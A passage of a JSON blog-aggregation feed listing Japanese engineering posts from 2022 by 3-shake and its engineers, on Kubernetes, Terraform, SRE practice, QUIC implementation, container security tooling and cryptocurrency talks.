SchedulerのHTTP...","link":"https://zenn.dev/satohjohn/articles/20ebf8d1bed1d1","isoDate":"2022-12-04T13:48:19.000Z","dateMiliSeconds":1670161699000,"authorName":"SatohJohn","authorId":"SatohJohn"},{"title":"【Codezine掲載】エンジニアの事業貢献、必要な第一歩とは？ 松本亮介氏\xd7スリーシェイクが解説！ エンジニアがプロダクトやビジネスへの理解を深める方法","contentSnippet":"「デベロッパーの成長と課題解決に貢献するメディア」をコンセプトに情報発信を行うソフトウェア開発者向けWebメディア「Codezine」に、弊社SREである手塚と、多数の企業で技術顧問などを務める松本亮介氏の対談記事が掲載されましたThe post 【Codezine掲載】エンジニアの事業貢献、必要な第一歩とは？ 松本亮介氏\xd7スリーシェイクが解説！ エンジニアがプロダクトやビジネスへの理解を深める方法 first appeared on sreake.com | 株式会社スリーシェイク.","link":"https://sreake.com/blog/codezine_engineer_product/","isoDate":"2022-11-29T05:25:53.000Z","dateMiliSeconds":1669699553000,"authorName":"Sreake","authorId":"Sreake"},{"title":"Google BigQuery: The Definitive Guideを読んでみた","contentSnippet":"はじめに 2021年スリーシェイクに入社してから案件で BigQuery を触ったのをきっかけに、Google BigQuery: The Definitive Guideを読んだので本の内容を一部紹介します。 10章ま […]The post Google BigQuery: The Definitive Guideを読んでみた first appeared on sreake.com | 株式会社スリーシェイク.","link":"https://sreake.com/blog/google-bigquery-the-definitive-guide/","isoDate":"2022-11-29T02:25:13.000Z","dateMiliSeconds":1669688713000,"authorName":"Sreake","authorId":"Sreake"},{"title":"オブザーバビリティについて理解する (収集・分析・可視化）","contentSnippet":"クラウド基盤の登場により、自社でサーバーを構築してシステムを運用するオンプレ以外の選択肢が増えてきました。多くの企業では、クラウド基盤を活用してシステム運用の効率化を図っているでしょう。 しかし、システムによってはまだま […]The post オブザーバビリティについて理解する (収集・分析・可視化） first appeared on sreake.com | 株式会社スリーシェイク.","link":"https://sreake.com/blog/observability/","isoDate":"2022-11-29T01:05:03.000Z","dateMiliSeconds":1669683903000,"authorName":"Sreake","authorId":"Sreake"},{"title":"複数の Terraform リソースを一度に別の tfstate ファイルに移動する","contentSnippet":"Terraform の tfstate ファイル間のリソースの移動方法は，基本的には以下の記事の通りです。https://www.karakaram.com/moving-terraform-resources-to-another-tfstate-file/この記事では複数リソースを移動したい場合の方法を書きます。 方法やることはシンプルで，リソースをファイルで列挙して xargs で terraform state mv を繰り返すだけです。移動元ディレクトリで terraform state list を実行することで，その tfstate ファイル内の全リソースを取...","link":"https://zenn.dev/toshikish/articles/61db8661cb28ba","isoDate":"2022-11-25T07:33:50.000Z","dateMiliSeconds":1669361630000,"authorName":"toshikish","authorId":"toshikish"},{"title":"docker-buildxとmulti-platform build周りについてまとめ","contentSnippet":"最近docker buildxを使ったmulti-platform build周りについての知見がある程度溜まってきたので必要そうな情報をまとめておく。buildx自体が実際に使うとハマりどころが多いので、すんなりと納得できるような文章がかけてないとは思うけど、実際に触る人がハマったり疑問に思ったりする内容の穴埋めはある程度できてるとは思ってる。ちなみにこの記事を書いてる時点のdocker-buildxの最新バージョンがv0.9.1なので、貼ってあるbuildxのリンクについては基本このバージョンのものになる。 docker-buildxってなに？リポジトリを見るとdock...","link":"https://zenn.dev/bells17/articles/docker-buildx","isoDate":"2022-11-19T16:52:45.000Z","dateMiliSeconds":1668876765000,"authorName":"bells17","authorId":"bells17"},{"title":"[3-shake 秋季インターンブログ] eBPF によるコンテナセキュリティツールの Tetragon を検証してみた","contentSnippet":"Sreake事業部で2022年10月11日 ~ 24日に開催された短期インターンに参加しました。eBPF によるコンテナランタイムセキュリティツールの Tetragon の技術検証と運用方法の提案を行いました。以下では、その成果をまとめたいと思います。The post [3-shake 秋季インターンブログ] eBPF によるコンテナセキュリティツールの Tetragon を検証してみた first appeared on sreake.com | 株式会社スリーシェイク.","link":"https://sreake.com/blog/ebpf-tetragon/","isoDate":"2022-11-15T05:43:00.000Z","dateMiliSeconds":1668490980000,"authorName":"Sreake","authorId":"Sreake"},{"title":"[3-shake 秋季インターンブログ] eBPF によるコンテナセキュリティツールの Tetragon を検証してみた","contentSnippet":"Sreake事業部で2022年10月11日 ~ 24日に開催された短期インターンに参加しました。eBPF によるコンテナランタイムセキュリティツールの Tetragon の技術検証と運用方法の提案を行いました。以下では、その成果をまとめたいと思います。The post [3-shake 秋季インターンブログ] eBPF によるコンテナセキュリティツールの Tetragon を検証してみた first appeared on sreake.com | 株式会社スリーシェイク.","link":"https://sreake.com/blog/ebpf-tetragon/","isoDate":"2022-11-14T00:00:00.000Z","dateMiliSeconds":1668384000000,"authorName":"Sreake","authorId":"Sreake"},{"title":"RPM の install, uninstall 時に実行される script の確認","contentSnippet":"ある RPM Package のインストール、アンインストール時にどんな処理が行われているのか確認したいことがある そんな時な rpm コマンドの --scripts オプションを使用する rpm -qp --scripts ./some.rpm","link":"https://blog.1q77.com/2022/11/rpm-scripts/","isoDate":"2022-11-10T23:38:02.000Z","dateMiliSeconds":1668123482000,"authorName":"yteraoka","authorId":"yteraoka"},{"title":"AWS IAM ポリシーの StringNotEquals 条件の複数値指定は AND になる","contentSnippet":"AWS IAM ポリシーの条件で同一キーに対して複数値を指定した場合，通常は OR で評価されます。例えば，以下の StringEquals 条件の例では，aws:PrincipalTag/role が audit または security のいずれかであれば true になります。\\"Condition\\": {  \\"StringEquals\\": {    \\"aws:PrincipalTag/role\\": [ \\"audit\\", \\"security\\" ]  }}では StringNotEquals 条件にするとどうでしょうか？例えば以下のポリシーで aws:Principal...","link":"https://zenn.dev/toshikish/articles/2d9274783acbae","isoDate":"2022-11-10T08:31:56.000Z","dateMiliSeconds":1668069116000,"authorName":"toshikish","authorId":"toshikish"},{"title":"[3-shake 秋季インターンブログ] Config Connectorの検証","contentSnippet":"SRE技術の調査と研究を行う目的で2022年10月11日 ~ 24日に開催された短期インターンに参加しました。2週間という期間を使って、Google CloudのConfig Connectorについて調査を行ったので、本記事ではその調査結果をまとめます。The post [3-shake 秋季インターンブログ] Config Connectorの検証 first appeared on sreake.com | 株式会社スリーシェイク.","link":"https://sreake.com/blog/config-connectortest/","isoDate":"2022-11-09T03:02:42.000Z","dateMiliSeconds":1667962962000,"authorName":"Sreake","authorId":"Sreake"},{"title":"2022年10月のふりかえり、まとめ","contentSnippet":"7年ぶりにふり返りするような気がします。これぶりですかね。blog.masasuzu.net10月は思い立って細かいことでも記録に残すようにし始めたのでサブブログの月間投稿数が増えてます。このまま続けたいところです。メインブログは相変わらず0なのでちゃんと書きたいところではあります。2022-10-01から1ヶ月間の記事一覧 - ふり返る暇なんて無いね仕事10月は端境期だったので、技術検証をメインでやってました。技術メインブログの方はどちらかというとパブリック向けに書いてます。ただ、この方針だと記事がゆるい記事が書きにくくなってきたので、サブブログを作った経緯があります。サブブログの技術記事は他の誰かのためではなく未来の自分が思い出すために書くをモットーに書いてます。なのでゆるく、細かい系のことも気軽に書いてます。分からないことは分からないと明示する。途中でも経過を残す。恥も残す。そんな感じです。以前とくらべてGoogle Cloud回りを10月はいじってた感じですね。build-in commandのmanが引けなくて困った - ふり返る暇なんて無いねt3系インスタンスのスペックについて - ふり返る暇なんて無いねGoogle Cloudの外部HTTP(S)ロードバランサと外部HTTP(S)ロードバランサ(従来型)の違いがわからなかった。 - ふり返る暇なんて無いね未解決: Google Cloud Storageの静的配信でnginxで言うところのtry_files的なことをしたかった。。。。 - ふり返る暇なんて無いねはてなブログのカテゴリごとのRSSフィード - ふり返る暇なんて無いねGitHub Actionsで save-state とset-output が廃止されるようです。 - ふり返る暇なんて無いね故障と障害の違いがわからずに困惑してた - ふり返る暇なんて無いね資格PCA取りました!11月にはPCA、KCNA、年内にCKA、CKADを取ることを目標に業務とは別に学習してます。なお、業務ではGoogle CloudもKubernetesも今のところ触る余地ないです。が、将来の投資として学習してます。近い未来で使うのが目に見えてるので。Google Cloud認定 Professional Cloud Architect合格してた - ふり返る暇なんて無いね11月末ターゲットで2個資格試験受けます - ふり返る暇なんて無いね旅土曜日の午前中に温泉入るのにはまってます。休日の早い時間に行動すると時間の有効活用ができるなとしみじみ感じてます。人生に疲れたので熱海で温泉入ってきた - ふり返る暇なんて無いね横須賀で温泉入ってきた - ふり返る暇なんて無いね江ノ島に行ってきて午前中だけで満足した - ふり返る暇なんて無いね生活寒くなりましたが、がんばります。今季初暖房使いました。 - ふり返る暇なんて無いね技術書を複数回読むということ - ふり返る暇なんて無いねワクチン4回目打った\uD83D\uDC89\uD83D\uDC89\uD83D\uDC89\uD83D\uDC89 - ふり返る暇なんて無いね11月に向けてといっても11月始まってますが。11月は資格の勉強もあるし、新しい固めのお仕事も始まるので、だいぶヘビーになる予感を感じてます。寒くなる季節なので体調には気を付けつつも、引き続き温泉につかり、ブログ書くのも続けて行きたいですね。","link":"https://blog.masasuzu.net/entry/2022/11/09/082007","isoDate":"2022-11-08T23:20:07.000Z","dateMiliSeconds":1667949607000,"authorName":"SUZUKI, Masashi","authorId":"masasuzu"},{"title":"[3-shake 秋季インターンブログ] Trivy Operator を用いた脆弱性管理の提案","contentSnippet":"Sreake 事業部は SRE関連技術に強みを持つエンジニアによるコンサルテーションサービスを提供する事業部であり、私たちも SRE 技術の調査と研究を行う目的で2022年10月11日 ~ 24日に開催された短期インターンに参加しました。2週間という期間を使って、Trivy Operator の技術検証と運用方法の提案を行いました。本記事では、その成果をまとめたいと思います。The post [3-shake 秋季インターンブログ] Trivy Operator を用いた脆弱性管理の提案 first appeared on sreake.com | 株式会社スリーシェイク.","link":"https://sreake.com/blog/trivy_operator_vulnerability/","isoDate":"2022-11-07T07:04:20.000Z","dateMiliSeconds":1667804660000,"authorName":"Sreake","authorId":"Sreake"},{"title":"/etc/hosts で wildcard や CNAME 対応させたい","contentSnippet":"macOS での話です。(macOS Ventura でも機能することを確認しました) /etc/hosts で 203.0.113.2 *.example.com みたいに wildcard に対応させたいことが稀にあります。 また、AWS の Application Load Balancer のように IP アドレスの固定され","link":"https://blog.1q77.com/2022/10/mac-etc-resolver/","isoDate":"2022-10-30T14:56:34.000Z","dateMiliSeconds":1667141794000,"authorName":"yteraoka","authorId":"yteraoka"},{"title":"ビットコイン・ブロックチェーン概論","contentSnippet":"Open Source Conference 2022 Online Fallの発表に使用した資料です。\\r↓セミナー情報\\rhttps://event.ospn.jp/osc2022-online-fall/session/685055\\r↓日本暗号通貨ユーザ会のページ\\rhttps://cryptocurrency.connpass.com/","link":"https://speakerdeck.com/shukob/bitutokoinburotukutiengai-lun","isoDate":"2022-10-29T04:00:00.000Z","dateMiliSeconds":1667016000000,"authorName":"Shu Kobuchi","authorId":"kobuchi"},{"title":"[2022/10/28] #kubenews 今週のKubernetes + Cloud Native + その他ニュース","contentSnippet":"#kubenewsの2022年10月28日の回で話す、@bells17が今週気になったニュース記事をまとめたものです自分が気になった今週のKubernetes + Cloud Native + その他なニュースをまるっとまとめておいて、その中から時間内に話せるものを話そうと思ってますこの記事自体はざっと読んで書いてるものが多いので、詳細はリンクとかで貼ってる記事の中を読んでもらった方が正確です配信URL:https://youtu.be/whnN4hwsIYg 告知とかニュースっぽいもの Open Networking Conference Japanちょうど今日開催し...","link":"https://zenn.dev/bells17/articles/k8s-cloud-native-and-other-20221028","isoDate":"2022-10-28T13:05:14.000Z","dateMiliSeconds":1666962314000,"authorName":"bells17","authorId":"bells17"},{"title":"Kubernetes クラスタ内ホスト名に CNAME レコードでエイリアスを付与したい","contentSnippet":"Kubernetes クラスタ内で使えるホスト名に CNAME レコード相当でエイリアスを付与したい場合を考えます。クラスタ内では CoreDNS が使われているものとします。 TL;DRCorefile（CoreDNS の設定ファイル）で rewrite プラグインを使って記述します。例えば Service のアドレスである foo.default.svc.cluster.local を foo.example.com にエイリアスしたい場合は以下のように行を追加します。apiVersion: v1kind: ConfigMapmetadata:  name: cor...","link":"https://zenn.dev/toshikish/articles/7f555dbf1b4b7d","isoDate":"2022-10-28T10:45:26.000Z","dateMiliSeconds":1666953926000,"authorName":"toshikish","authorId":"toshikish"},{"title":"Bitcoinナカモト論文補足資料","contentSnippet":"https://cryptocurrency.connpass.com/event/262938/\\rビットコインとか勉強会#70《Bitcoinナカモト論文》【暗号通貨読書会#46】 の補足資料です。","link":"https://speakerdeck.com/shukob/bitcoinnakamotolun-wen-bu-zu-zi-liao","isoDate":"2022-10-28T04:00:00.000Z","dateMiliSeconds":1666929600000,"authorName":"Shu Kobuchi","authorId":"kobuchi"},{"title":"Google Cloud Binary Authorization 徹底調査","contentSnippet":"Binary Authorization とは 概要 コンテナベースのアプリケーションに ソフトウェアサプライチェーンのセキュリティを提供する Google Cloud のサービスです。 補足 ソフトウェアサプライチェー […]The post Google Cloud Binary Authorization 徹底調査 first appeared on sreake.com | 株式会社スリーシェイク.","link":"https://sreake.com/blog/google-cloud-binary-authorization/","isoDate":"2022-10-27T00:46:10.000Z","dateMiliSeconds":1666831570000,"authorName":"Sreake","authorId":"Sreake"},{"title":"Gitlab Ci で Kaniko build し Trivy で scan する","contentSnippet":"GitLab CI でコンテナイメージを Docker daemon の不要な Kaniko で build し、それを Trivy でスキャンする方法 まず、kaniko で --tarPath を指定して tar ファイルで書き出す 書き出す先を artifacts で指定したディレクトリ","link":"https://blog.1q77.com/2022/10/gitlab-ci-kaniko-and-trivy/","isoDate":"2022-10-26T14:34:28.000Z","dateMiliSeconds":1666794868000,"authorName":"yteraoka","authorId":"yteraoka"},{"title":"PodSecurityPolicy について考えてみた","contentSnippet":"話すこと 案件で Kubernetes のセキュリティについて調べることがあったので、各レイヤで何が必要かを検討しました。 Node レイヤ・Inspector・(falco) Pod レイヤ・(falco)・セキュリテ […]The post PodSecurityPolicy について考えてみた first appeared on sreake.com | 株式会社スリーシェイク.","link":"https://sreake.com/blog/pod-security-policy/","isoDate":"2022-10-24T02:15:18.000Z","dateMiliSeconds":1666577718000,"authorName":"Sreake","authorId":"Sreake"},{"title":"Anthos Service Mesh の Outbound Access Log を出力する","contentSnippet":"Anthos Service Mesh のアクセスログはデフォルトでは Service への Inbound しか出力されません。 エラーが発生した場合は Outbound のログも出力されます。 出力先は Cloud Logging で HTTP の情報は Load Balancer などと同様に httpRequest という Object","link":"https://blog.1q77.com/2022/10/asm-access-log/","isoDate":"2022-10-21T15:33:40.000Z","dateMiliSeconds":1666366420000,"authorName":"yteraoka","authorId":"yteraoka"},{"title":"Kubernetes で StatefulSet の Volume を resize する","contentSnippet":"Kubernetes で StatefulSet に volumeClaimTemplates を指定して Persistent Volume を使用している環境で volume のサイズを変更する方法。 素直に StatefulSet の manifest を変更して apply しようとすると次のように StatefulSet で更新可能なのは replicas, template, updateStragety だけだよとエラーに","link":"https://blog.1q77.com/2022/10/kubernetes-resize-statefulset-volume/","isoDate":"2022-10-18T13:36:49.000Z","dateMiliSeconds":1666100209000,"authorName":"yteraoka","authorId":"yteraoka"},{"title":"DNS over HTTPS 通信の中身を確認する","contentSnippet":"iPhone の HTTP(S) 通信を OWASP ZAP で覗いてみたたら 8.8.8.8, 8.8.4.4 に対して DNS over HTTPS の通信を見つけたのでどんなやり取りをしているのか確認してみた。 DNS over HTTPS でのリクエスト # リクエストは HTTP の GET メソッド","link":"https://blog.1q77.com/2022/10/iphone-dns-over-https/","isoDate":"2022-10-15T15:11:55.000Z","dateMiliSeconds":1665846715000,"authorName":"yteraoka","authorId":"yteraoka"},{"title":"apt-key is deprecated への対応","contentSnippet":"Debian 系の Linux で古いインストール手順なんかを見てコマンドをコピペしていると出くわすこのメッセージ Warning: apt-key is deprecated. Manage keyring files in trusted.gpg.d instead (see apt-key(8)). package 署名の公開鍵の管理方法が変わったみたいです リ","link":"https://blog.1q77.com/2022/10/apt-key-is-deprecated/","isoDate":"2022-10-15T13:06:00.000Z","dateMiliSeconds":1665839160000,"authorName":"yteraoka","authorId":"yteraoka"},{"title":"CDK for Terraform を理解する","contentSnippet":"はじめに 基本的な使い方をまとめてみました。 CDK for Terraform Is Now Generally Available 今回は TypeScript を使っている前提で記述するため、他の言語を利用する場合 […]The post CDK for Terraform を理解する first appeared on sreake.com | 株式会社スリーシェイク.","link":"https://sreake.com/blog/cdk-for-terraform/","isoDate":"2022-10-06T05:44:00.000Z","dateMiliSeconds":1665035040000,"authorName":"Sreake","authorId":"Sreake"},{"title":"CDK for Terraform を理解する","contentSnippet":"はじめに 基本的な使い方をまとめてみました。 CDK for Terraform Is Now Generally Available 今回は TypeScript を使っている前提で記述するため、他の言語を利用する場合 […]The post CDK for Terraform を理解する first appeared on sreake.com | 株式会社スリーシェイク.","link":"https://sreake.com/blog/cdk-for-terraform/","isoDate":"2022-10-06T02:27:54.000Z","dateMiliSeconds":1665023274000,"authorName":"Sreake","authorId":"Sreake"},{"title":"Istio のサービスへの接続でプロトコルエラーになる","contentSnippet":"現象Istio サービスメッシュを有効にした Kubernetes クラスタ内に立てた Service に接続しようとするも，upstream connect error or disconnect/reset before headers. reset reason: protocol error が出て到達できない。例えば，以下のような Service に gRPC で接続しようとしても失敗する。apiVersion: v1kind: Servicemetadata:  name: my-servicespec:  selector:    app.kubern...","link":"https://zenn.dev/toshikish/articles/d0dd54ae067bed","isoDate":"2022-10-04T02:55:06.000Z","dateMiliSeconds":1664852106000,"authorName":"toshikish","authorId":"toshikish"},{"title":"CPU Resource limit に思いを馳せてみた","contentSnippet":"本日お伝えしたいこと あらゆるものが抽象化・仮想化されても、CPU やメモリの仕組みやプロトコルの性質などの計算機における基礎知識は持っておかないと調査がうまくいかない場面がある、ということです。具体的なエピソードを交え […]The post CPU Resource limit に思いを馳せてみた first appeared on sreake.com | 株式会社スリーシェイク.","link":"https://sreake.com/blog/cpu-resource-limit/","isoDate":"2022-09-27T08:03:06.000Z","dateMiliSeconds":1664265786000,"authorName":"Sreake","authorId":"Sreake"},{"title":"SQL*Loaderで複数の文字コードが混ざったデータをロードする","contentSnippet":"SQL*Loaderで複数の文字コードが混ざったデータをロードする 概要単一のテキストファイル内で特定のカラムのみ文字コードが違うファイルをSQL*Loaderでデータベースに取り込む方法 注意本記事で扱っている対処方法はおそらく紛れ込んだ文字コードが本来あるべき文字コードの一部として解釈できない場合使用できないと思います。(未検証)最低限文字化けしながらも読み込める状態を想定しています。 結論コントロールファイル内で文字コードの変換が必要なカラムに以下の関数を適用する。column \\"CONVERT(:column, \'target_charset\', \'s...","link":"https://zenn.dev/nnaka2992/articles/load_complex_characterset_oracle","isoDate":"2022-09-25T14:48:29.000Z","dateMiliSeconds":1664117309000,"authorName":"NAKADATE Naoki","authorId":"nnaka2992"},{"title":"トイルを撲滅するための3つのステップ","contentSnippet":"トイルを削減できなければ、前向きな作業にかけられる時間が減るだけでなく、作業員の士気の減退やスキルアップの機会の減少などのデメリットがあります。The post トイルを撲滅するための3つのステップ first appeared on sreake.com | 株式会社スリーシェイク.","link":"https://sreake.com/blog/toil-eradication-3step/","isoDate":"2022-09-14T09:34:07.000Z","dateMiliSeconds":1663148047000,"authorName":"Sreake","authorId":"Sreake"},{"title":"golangで作るQUICプロトコル(HTTP3リクエストの送信と受信)","contentSnippet":"はじめに前回までの記事でQUICプロトコル上でTLS1.3のハンドシェイクが完了しました。TLS1.3のハンドシェイクが完了したということは、Application Data=HTTPとかをサーバとやり取りできるということになります。今回はサーバにHTTP3のリクエストを送り、メッセージを受信してみます。ソースは以下にあります。https://github.com/sat0ken/go-quic HTTP2とHTTP3HTTP2からストリームとフレームという仕組みが用いられて、1つのTCPコネクションがストリームとなり、ストリーム内で複数のフレームがHTTPヘッダや...","link":"https://zenn.dev/satoken/articles/golang-quic-protocol3","isoDate":"2022-09-04T04:06:32.000Z","dateMiliSeconds":1662264392000,"authorName":"satoken","authorId":"satoken"},{"title":"[2022/09/02] #kubenews 今週のKubernetes + Cloud Native + その他ニュース","contentSnippet":"#kubenewsの2022年09月2日の回で話す、@bells17が今週気になったニュース記事をまとめたものです自分が気になった今週のKubernetes + Cloud Native + その他なニュースをまるっとまとめておいて、その中から時間内に話せるものを話そうと思ってますこの記事自体はざっと読んで書いてるものが多いので、詳細はリンクとかで貼ってる記事の中を読んでもらった方が正確です配信URL:https://youtu.be/r2YsmQFcv-o 告知とかニュースっぽいもの controller-runtime clientについてhttps://zenn....","link":"https://zenn.dev/bells17/articles/k8s-cloud-native-and-other-20220902","isoDate":"2022-09-02T13:01:11.000Z","dateMiliSeconds":1662123671000,"authorName":"bells17","authorId":"bells17"},{"title":"Visual Studio Codeで使えるリモート環境のdevcontainerが意外と便利そうだったのでまとめ","contentSnippet":"試してたらたまたまVisual Studio Code(vscode)のdevcontainer(Remote Container)が、Remote SSH経由でリモート環境でも使えることを知ったので、devcontainer用の環境構築方法やdevcontainerの構築方法についてまとめてみた今まではローカル環境のdockerか、codespaceでしか利用できないのかなと思っていたのだけど、リモート含めて利用できるとかなり便利そうな印象だったので一通り試してみました最近はRemote SSHでリモート環境を利用するケースが多いのでリモート環境で使えないならそんなに使えないかなと...","link":"https://zenn.dev/bells17/articles/remote-ssh-devcontainer","isoDate":"2022-09-01T18:16:25.000Z","dateMiliSeconds":1662056185000,"authorName":"bells17","authorId":"bells17"},{"title":"負荷テストツール K6 について調べてみた","contentSnippet":"はじめに K6 を初めて触ってから 7-8ヶ月くらいたったので、K6 のツール周りに関する情報紹介で社内で発信した情報をまとめてみました。 k6 jslib まず、K6 には k6 jslib という K6 の拡張ツール […]The post 負荷テストツール K6 について調べてみた first appeared on sreake.com | 株式会社スリーシェイク.","link":"https://sreake.com/blog/learn-about-k6/","isoDate":"2022-09-01T02:10:07.000Z","dateMiliSeconds":1661998207000,"authorName":"Sreake","authorId":"Sreake"},{"title":"golangで作るQUICプロトコル(TLS1.3 ハンドシェイクの終了まで)","contentSnippet":"はじめに前回の記事まででInitial Packetを生成してサーバに送信しました。今回の記事はその続きとなり、サーバからのパケットをパースしてHandshake Packetを送信するところまで解説したいと思います。ソースコードは以下にあります。https://github.com/sat0ken/go-quic Retry Packetの受信→Initial Packetの送信quic-goのサーバにInitial Packetを送信すると、Retry Packetが返ってきます。このへんはサーバの実装により異なってくるのですが、quic-goはそういう実装になっ...","link":"https://zenn.dev/satoken/articles/golang-quic-protocol2","isoDate":"2022-08-27T16:50:00.000Z","dateMiliSeconds":1661619000000,"authorName":"satoken","authorId":"satoken"},{"title":"controller-runtime clientについて","contentSnippet":"KubernetesでOperatorやControllerを開発する際に利用するフレームワークであるcontroller-runtimeのclientについて調べたのでまとめます。この記事の目的は以下のような感じになります:controller-runtimeが提供するKubernetes clientの概要についてまとめることcontroller-runtime client周りの追加の不明点などがあった場合には、この記事をベースにコードベースで調べたいことをすぐに調べられる程度にはコードレベルで詳しい内容をまとめること以下についてわかるようになること各種内部clien...","link":"https://zenn.dev/bells17/articles/controller-runtime-client","isoDate":"2022-08-27T09:30:47.000Z","dateMiliSeconds":1661592647000,"authorName":"bells17","authorId":"bells17"},{"title":"golangで作るQUICプロトコル(Initial Packetの送信まで)","contentSnippet":"はじめについ最近HTTP3のRFC9114として正式に発行されました。HTTP3はQUICプロトコル上で実装されているものです。HTTP3はGoogleのTOPページなど既に日常的に使われています。業務でQUICやHTTP3でコードを書くことはまだあまりないと思いますが、まぁいずれそういう時代もくるでしょう。そういう時が来たときにあたふたするわけにはいかないので、今回はQUICとHTTP3プロトコルスタックを実装して学んでみることにします。今回のルールとゴールです。udpパケットの送信と受信にnetパッケージを使用するTLSは自分で実装したものを使用、crypto/...","link":"https://zenn.dev/satoken/articles/golang-quic-protocol","isoDate":"2022-08-24T23:10:48.000Z","dateMiliSeconds":1661382648000,"authorName":"satoken","authorId":"satoken"},{"title":"疲弊しないSREチームを作るために必要な6つのポイント","contentSnippet":"本記事では、疲弊しないSREチームを作るために必要な6つのポイントを紹介します。SREチームをどのように形成すればよいか悩んでいる企業様は参考にしてください。The post 疲弊しないSREチームを作るために必要な6つのポイント first appeared on sreake.com | 株式会社スリーシェイク.","link":"https://sreake.com/blog/not-exhaustion-engineer/","isoDate":"2022-08-23T03:36:21.000Z","dateMiliSeconds":1661225781000,"authorName":"Sreake","authorId":"Sreake"},{"title":"リリースエンジニアリングについて理解する [デプロイ戦略]","contentSnippet":"サービスのリリースにかかるダウンタイムを減らし、安定稼働する戦略を取ることはユーザーからの満足度及び信頼度向上につながります。本記事では、SREの取り組みのひとつであるリリースエンジニアリング、そしてデプロイ戦略について解説していきます。The post リリースエンジニアリングについて理解する [デプロイ戦略] first appeared on sreake.com | 株式会社スリーシェイク.","link":"https://sreake.com/blog/release-engineer/","isoDate":"2022-08-23T03:00:00.000Z","dateMiliSeconds":1661223600000,"authorName":"Sreake","authorId":"Sreake"},{"title":"Software Design 2022年9月号にコードリーディングに関する記事を寄稿しました","link":"https://bells17.medium.com/oss-source-code-reading-29392edf80fe?source=rss-713cf42ce34d------2","isoDate":"2022-08-18T15:06:54.000Z","dateMiliSeconds":1660835214000,"authorName":"bells17","authorId":"bells17"},{"title":"アンチパターンからSREを理解する","contentSnippet":"日本国内でも、サービスの信頼性向上のためにSREに取り組む企業も増えてきました。しかし誤ったやり方で実施したがゆえに、思ったように成果が出ないと嘆く企業もあるのではないでしょうか。 そこで今回はSREのアンチパターンをも […]The post アンチパターンからSREを理解する first appeared on sreake.com | 株式会社スリーシェイク.","link":"https://sreake.com/blog/anti-pattern-sre/","isoDate":"2022-08-17T08:47:45.000Z","dateMiliSeconds":1660726065000,"authorName":"Sreake","authorId":"Sreake"},{"title":"Terraform state の構成の提案","contentSnippet":"動機 単一の Terraform state でリソースを構築していると、徐々にリソース数が増加し、コードの見通しが悪くなったり plan 時間が長くなったりといった問題が発生します。 単一 state で運用していたが […]The post Terraform state の構成の提案 first appeared on sreake.com | 株式会社スリーシェイク.","link":"https://sreake.com/blog/terraform-state-structure/","isoDate":"2022-08-15T23:16:16.000Z","dateMiliSeconds":1660605376000,"authorName":"Sreake","authorId":"Sreake"},{"title":"Ethereum The Merge 〜これからのフルノード運用〜","contentSnippet":"The MergeでEthereumのフルノード運用がどう変わるのか、廃止になるTestnetは何かなどをLTでお話ししました。\\rhttps://cryptocurrency.connpass.com/event/256526/","link":"https://speakerdeck.com/shukob/ethereum-the-merge-korekarafalsehurufalsedoyun-yong","isoDate":"2022-08-14T04:00:00.000Z","dateMiliSeconds":1660449600000,"authorName":"Shu Kobuchi","authorId":"kobuchi"},{"title":"cobra は便利になっている","contentSnippet":"2022年3-shake SRE Tech Talk #4\\rhttps://3-shake.connpass.com/event/253028/","link":"https://speakerdeck.com/nwiizo/cobra-habian-li-ninatuteiru","isoDate":"2022-08-04T04:00:00.000Z","dateMiliSeconds":1659585600000,"authorName":"nwiizo","authorId":"nwiizo"},{"title":"ビットコイン・ライトニングネットワーク概論","contentSnippet":"https://cryptocurrency.connpass.com/event/254173/\\rhttps://event.ospn.jp/osc2022-online-kyoto/session/618650\\r【OSC2022 Online Kyoto にて発表】\\rビットコインは送金トランザクションの処理量に限界があり、ブロックチェーンの外での送金を行うオフチェーン技術により手数料の軽減と、送金の高速化を実現できます。オフチェーンの中でもビットコインと同様、中央管理者のいないライトニングネットワークの開発が進んでいます。ビットコインの復習を少しした後、ライトニング・ネットワーク技術の概論をお話しいたしました。","link":"https://speakerdeck.com/shukob/bitutokoinraitoningunetutowakugai-lun","isoDate":"2022-07-30T04:00:00.000Z","dateMiliSeconds":1659153600000,"authorName":"Shu Kobuchi","authorId":"kobuchi"},{"title":"[2022/07/015] #kubenews 今週のKubernetes + Cloud Native + その他ニュース","contentSnippet":"#kubenewsの2022年07月15日の回で話す、@bells17が今週気になったニュース記事をまとめたものです自分が気になった今週のKubernetes + Cloud Native + その他なニュースをまるっとまとめておいて、その中から時間内に話せるものを話そうと思ってますこの記事自体はざっと読んで書いてるものが多いので、詳細はリンクとかで貼ってる記事の中を読んでもらった方が正確です配信URL:https://youtu.be/ar1_fxX601E 告知とかニュースっぽいもの 『Linuxで動かしながら学ぶTCP/IPネットワーク入門』でネットワークの勉強をし...","link":"https://zenn.dev/bells17/articles/k8s-cloud-native-and-other-20220715","isoDate":"2022-07-15T07:31:08.000Z","dateMiliSeconds":1657870268000,"authorName":"bells17","authorId":"bells17"},{"title":"【Codezine掲載】SREは運用チームだけの問題？ 開発者のメリットをGoogle\xd7スリーシェイクがプラクティスとともに解説！","contentSnippet":"「デベロッパーの成長と課題解決に貢献するメディア」をコンセプトに情報発信を行うソフトウェア開発者向けWebメディア「Codezine」に、Srekae事業部部長手塚の対談記事が掲載されました。The post 【Codezine掲載】SREは運用チームだけの問題？ 開発者のメリットをGoogle\xd7スリーシェイクがプラクティスとともに解説！ first appeared on sreake.com | 株式会社スリーシェイク.","link":"https://sreake.com/blog/codezine_sre_google/","isoDate":"2022-07-07T06:46:00.000Z","dateMiliSeconds":1657176360000,"authorName":"Sreake","authorId":"Sreake"},{"title":"[2022/07/01] #kubenews 今週のKubernetes + Cloud Native + その他ニュース","contentSnippet":"#kubenewsの2022年07月01日の回で話す、@bells17が今週気になったニュース記事をまとめたものです自分が気になった今週のKubernetes + Cloud Native + その他なニュースをまるっとまとめておいて、その中から時間内に話せるものを話そうと思ってますこの記事自体はざっと読んで書いてるものが多いので、詳細はリンクとかで貼ってる記事の中を読んでもらった方が正確です配信URL:https://youtu.be/R7VHtaBZFkQ 告知とかニュースっぽいもの Kubernetes Novice Tokyo #20にてKueueのセッションを行...","link":"https://zenn.dev/bells17/articles/k8s-cloud-native-and-other-20220701","isoDate":"2022-07-01T11:14:01.000Z","dateMiliSeconds":1656674041000,"authorName":"bells17","authorId":"bells17"},{"title":"Datadogのログ管理コストをフィルター機能で削減をする","contentSnippet":"今回は、Datadogの料金体系に関するお話と、実際の案件で発生したコスト削減の対応を行ったお話をご紹介していきたいと思います。The post Datadogのログ管理コストをフィルター機能で削減をする first appeared on sreake.com | 